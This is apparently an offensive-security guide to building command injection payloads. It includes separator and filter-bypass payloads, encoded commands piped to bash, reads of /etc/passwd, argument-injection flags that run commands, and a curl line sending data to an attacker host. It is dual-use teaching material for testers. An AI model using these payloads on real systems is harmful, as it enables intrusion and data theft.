# Command Injection Payload Construction

## When to Use

Consult when Phase 1 identifies a potential shell interaction point. Teaches HOW to think about payload construction, not just what to paste.

---

## Separator Selection Logic

### Decision Tree

```
Can you see command output?
├── YES → Use any separator with `id` or `whoami`
│         Priority: ; > | > $() > ``
└── NO → Blind injection
         ├── Time allowed? → sleep/ping
         ├── DNS outbound? → nslookup/dig [EXTERNAL INFRA REQUIRED]
         ├── HTTP outbound? → curl/wget [EXTERNAL INFRA REQUIRED]
         └── Nothing works → Try argument injection instead

Semicolons blocked?
├── Try pipe: |
├── Try ampersand: &
├── Try OR: ||
├── Try AND: &&
├── Try newline: %0a
├── Try substitution: $() or ``
└── Try encoding: ${IFS} for spaces

All separators blocked?
├── Argument injection: -flag=value
├── Environment variable injection: if user input sets env vars
└── Stop — input likely doesn't reach shell
```

### OS-Specific Separator Behavior

| Separator | Unix (bash/sh) | Windows (cmd.exe) | Windows (PowerShell) |
|-----------|---------------|-------------------|---------------------|
| `;` | Sequential exec | Not a separator (literal) | Statement separator |
| `\|` | Pipe | Pipe | Pipe |
| `&` | Background exec | Sequential exec | Not standard |
| `&&` | AND (run if prev success) | AND | Not standard |
| `\|\|` | OR (run if prev fails) | OR | Not standard |
| `` ` `` | Command substitution | Not standard | Not standard |
| `$()` | Command substitution | Not standard | Subexpression |
| `%0a` | Newline separator | Sometimes works | Sometimes works |

---

## Injection Context Reasoning

### Direct Concatenation
```python
# Code: os.system("ping " + user_input)
# Input reaches shell directly. All separators available.
# Payload: ; id
# Result: ping ; id → ping fails, id runs
```

### Quoted Context (Single Quotes)
```python
# Code: os.system("echo '" + user_input + "'")
# You're INSIDE single quotes. Must break out first.
# Payload: '; id; echo '
# Result: echo ''; id; echo '' → breaks quote, runs id
```

### Quoted Context (Double Quotes)
```python
# Code: os.system('echo "' + user_input + '"')
# Inside double quotes. Must break out.
# Payload: "; id; echo "
# Result: echo ""; id; echo "" → breaks quote, runs id
# 
# OR: Use $() which is interpreted inside double quotes
# Payload: $(id)
# Result: echo "$(id)" → id runs, output embedded in echo
```

### Argument Position
```python
# Code: os.system("convert " + user_input + " output.png")
# You're an argument, not in quotes.
# Payload: ; id #
# Result: convert ; id # output.png → id runs, # comments out rest
#
# The # is important — it comments out the trailing arguments
```

### Filename Context
```python
# Code: os.system("cat " + user_filename)
# Payload: /etc/passwd
# Result: cat /etc/passwd → direct path traversal, no separator needed!
#
# Or with injection: file.txt; id
# Result: cat file.txt; id → both commands run
```

---

## Filter Bypass Techniques

### Space Bypass
If spaces are filtered, alternatives in bash:
```bash
{cat,/etc/passwd}           → cat /etc/passwd (brace expansion)
cat${IFS}/etc/passwd        → $IFS = Internal Field Separator (default: space/tab/newline)
cat$IFS/etc/passwd          → same
cat</etc/passwd             → redirect file as input
X=$'\x20';cat${X}/etc/passwd → hex space in variable
cat%09/etc/passwd           → tab character (URL encoded)
```

### Keyword Bypass
If specific commands are blocked:
```bash
# String concatenation
c'a't /etc/passwd           → bash ignores quotes between characters
c"a"t /etc/passwd           → same with double quotes
c\at /etc/passwd            → backslash escaping

# Variable construction
a=c;b=at;$a$b /etc/passwd   → constructs "cat" from parts

# Wildcard expansion
/b?n/c?t /etc/passwd        → /bin/cat
/???/??t /???/??ss??        → /bin/cat /etc/passwd
/b${u}in/c${u}at /e${u}tc/p${u}asswd  → undefined vars expand to empty

# Alternative commands (same effect)
# Instead of cat: tac, head, tail, less, more, nl, sort, uniq, strings, xxd, base64
# Instead of id: whoami, groups, w
# Instead of ls: dir, find, echo *
# Instead of wget/curl: python -c "import urllib...", ruby, perl, php
```

### Encoding Bypass
```bash
# Base64
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash    → decodes and runs "cat /etc/passwd"

# Hex
echo -e '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | bash

# Octal
$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'
```

---

## Argument Injection Targets

When separators are blocked but input becomes a command argument:

| Binary | Dangerous Arguments |
|--------|-------------------|
| `git` | `--upload-pack="cmd"`, `--exec="cmd"`, `-c core.sshCommand="cmd"` |
| `tar` | `--checkpoint=1 --checkpoint-action=exec=cmd` |
| `rsync` | `-e "cmd"`, `--rsh="cmd"` |
| `find` | `-exec cmd \;`, `-delete` |
| `ssh/scp` | `-o ProxyCommand="cmd"` |
| `curl` | `-o /path/file` (write file), `-x http://attacker` (exfil) |
| `zip/unzip` | `-T -TT "cmd"` |
| `python/ruby/perl` | `-c "code"` |
| `ffmpeg` | `-i "url"` (SSRF), various filter injection |
| `ImageMagick` | `-write /path/file`, `mvg:` protocol, `ephemeral:` |
